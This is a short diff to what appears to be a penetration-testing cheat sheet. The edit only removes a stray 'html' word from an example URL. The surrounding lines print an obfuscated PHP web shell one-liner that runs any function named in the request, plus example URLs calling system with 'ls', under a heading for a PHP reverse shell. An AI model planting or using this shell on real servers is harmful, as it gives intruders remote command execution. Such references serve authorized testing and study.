@@ -150,7 +150,7 @@ Example: http://site.com/path/to/shell.php?0=command
 ```php
 <?php $_="{"; $_=($_^"<").($_^">;").($_^"/"); ?><?=${'_'.$_}['_'](${'_'.$_}['__']);?>
 Example:
-html http://site.com/path/to/shell.php?_=function&__=argument
+http://site.com/path/to/shell.php?_=function&__=argument
 http://site.com/path/to/shell.php?_=system&__=ls
 ```
 ### PHP Reverse Shell > <a name="php_reverse_shell"></a>PHP Reverse Shell (Pentestmonkey)
